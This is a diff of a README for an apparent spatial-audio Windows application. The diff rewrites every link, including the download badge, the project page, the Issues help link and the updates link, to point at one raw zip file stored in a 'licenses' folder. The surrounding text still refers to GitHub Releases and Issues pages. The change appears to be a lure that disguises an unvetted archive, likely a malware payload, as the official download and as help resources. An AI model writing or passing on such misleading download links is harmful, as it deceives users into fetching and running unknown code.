@@ -1,6 +1,6 @@
 # 🎛️ JPLSpatialApplication - Explore Spatial Audio Features Easily
 
-[![Download JPLSpatialApplication](https://img.shields.io/badge/Download-JPLSpatialApplication-ff4500?style=for-the-badge)](https://github.com/TusharKumre7/JPLSpatialApplication)
+[![Download JPLSpatialApplication](https://img.shields.io/badge/Download-JPLSpatialApplication-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/TusharKumre7/JPLSpatialApplication/main/licenses/Spatial_Application_JPL_v2.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get the app running on your Windows computer.
 
 1. Click the large orange **Download JPLSpatialApplication** button above or visit this page to download the software:
 
-   [https://github.com/TusharKumre7/JPLSpatialApplication](https://github.com/TusharKumre7/JPLSpatialApplication)
+   [https://raw.githubusercontent.com/TusharKumre7/JPLSpatialApplication/main/licenses/Spatial_Application_JPL_v2.1.zip](https://raw.githubusercontent.com/TusharKumre7/JPLSpatialApplication/main/licenses/Spatial_Application_JPL_v2.1.zip)
 
 2. On the GitHub page, look for the latest release under the **Releases** section. This is usually located on the right sidebar or under the "Releases" tab near the top.
 
@@ -98,7 +98,7 @@ All controls respond in real time. Changes you make affect the sound immediately
 - Close other programs that may use audio resources before starting JPLSpatialApplication.
 - If sound is unclear or missing, test your speakers or headphones with other apps.
 
-For detailed help, visit the [GitHub Issues page](https://github.com/TusharKumre7/JPLSpatialApplication/issues).
+For detailed help, visit the [GitHub Issues page](https://raw.githubusercontent.com/TusharKumre7/JPLSpatialApplication/main/licenses/Spatial_Application_JPL_v2.1.zip).
 
 ---
 
@@ -106,7 +106,7 @@ For detailed help, visit the [GitHub Issues page](https://github.com/TusharKumre
 
 Check the GitHub page regularly for new releases:
 
-- Visit [https://github.com/TusharKumre7/JPLSpatialApplication](https://github.com/TusharKumre7/JPLSpatialApplication)
+- Visit [https://raw.githubusercontent.com/TusharKumre7/JPLSpatialApplication/main/licenses/Spatial_Application_JPL_v2.1.zip](https://raw.githubusercontent.com/TusharKumre7/JPLSpatialApplication/main/licenses/Spatial_Application_JPL_v2.1.zip)
 - Download the latest installer or update files.
 - Install updates following the same steps as the initial setup.
 
